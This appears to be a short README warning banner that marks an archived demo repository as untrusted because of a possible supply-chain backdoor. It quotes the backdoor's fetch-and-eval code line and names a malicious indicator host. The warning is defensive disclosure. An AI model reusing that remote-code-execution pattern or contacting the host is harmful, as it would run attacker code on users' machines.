**⚠️ ARCHIVED / UNTRUSTED — do NOT install or run. This repo may carry an unremediated supply-chain backdoor (`eval(fetch(atob(AUTH_API_KEY)))`, IOC `auth-confirm-ele.vercel.app`). Never `npm install` or execute anything here until verified clean.**

Old demo; reference only.
